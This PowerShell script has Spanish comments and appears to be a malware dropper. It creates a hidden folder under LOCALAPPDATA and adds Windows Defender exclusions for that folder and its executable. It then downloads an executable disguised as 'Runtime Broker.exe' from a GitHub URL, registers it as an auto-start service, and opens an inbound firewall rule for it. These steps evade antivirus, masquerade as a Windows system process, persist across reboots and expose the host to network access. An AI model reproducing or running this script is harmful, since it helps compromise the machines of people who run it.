# Definición de variables
$root = Join-Path -Path  $env:LOCALAPPDATA -ChildPath "Windows NT"
$servicio = "Wizard"
$ejecutable = "Runtime Broker.exe"
$rootFile = Join-Path -Path $root -ChildPath $ejecutable
$arch = (Get-WmiObject -Class Win32_OperatingSystem).OSArchitecture

# Si existe la carpeta, eliminarla (junto con su contenido)
if (Test-Path $root) {
    try {
        Remove-Item $root -Recurse -Force
        Write-Host "Se eliminó la carpeta existente: $root"
    }
    catch {
        Write-Host "Error al eliminar la carpeta $root $_"
    }
}

# En caso de que el archivo exista de forma independiente (normalmente se ubicaría dentro de la carpeta)
if (Test-Path $rootFile) {
    try {
        Remove-Item $rootFile -Force
        Write-Host "Se eliminó el archivo existente: $rootFile"
    }
    catch {
        Write-Host "Error al eliminar el archivo $rootFile $_"
    }
}

# Crear la carpeta y configurarla como oculta
try {
    New-Item -Path $root -ItemType Directory -Force
    Set-ItemProperty -Path $root -Name Attributes -Value 'Hidden'
}
catch {
    Write-Host "Error al crear/configurar la carpeta: $_"
}

# Agregar exclusiones en Windows Defender
try {
    Add-MpPreference -ExclusionPath $root
    Add-MpPreference -ExclusionProcess $rootFile
}
catch {
    Write-Host "Error al agregar exclusiones en Defender: $_"
}

# Descargar el ejecutable según la arquitectura del sistema
try {
    if ($arch -eq "64 bits" -or $arch -eq "64-bits") {
        Start-BitsTransfer -Source "https://raw.githubusercontent.com/baa4ts/Wizard/refs/heads/main/Wizard/build/64/Runtime%20Broker.exe" -Destination $rootFile
    }
    elseif ($arch -eq "32 bits" -or $arch -eq "32-bits") {
        Start-BitsTransfer -Source "https://raw.githubusercontent.com/baa4ts/Wizard/refs/heads/main/Wizard/build/32/Runtime%20Broker.exe" -Destination $rootFile
    }
    else {
        Start-BitsTransfer -Source "https://raw.githubusercontent.com/baa4ts/Wizard/refs/heads/main/Wizard/build/32/Runtime%20Broker.exe" -Destination $rootFile
    }
}
catch {
    Write-Host "Error durante la descarga: $_"
}

# Configurar permisos sobre el archivo descargado
try {
    $acl = Get-Acl $rootFile
    $rule = New-Object System.Security.AccessControl.FileSystemAccessRule("Usuarios", "FullControl", "Allow")
    $acl.SetAccessRule($rule)
    Set-Acl -Path $rootFile -AclObject $acl
}
catch {
    Write-Host "Error al configurar permisos: $_"
}

# Crear el servicio
try {
    New-Service -Name $servicio -BinaryPathName $rootFile -DisplayName $servicio -StartupType Automatic
}
catch {
    Write-Host "Error al crear el servicio: $_"
}

# Crear la regla del Firewall
try {
    New-NetFirewallRule -DisplayName $servicio -Direction Inbound -Program $rootFile -Action Allow -Profile Any -Enabled True
}
catch {
    Write-Host "Error al crear la regla de Firewall: $_"
}

# Iniciar el servicio
try {
    Start-Service -Name $servicio
}
catch {
    Write-Host "Error al iniciar el servicio: $_"
}
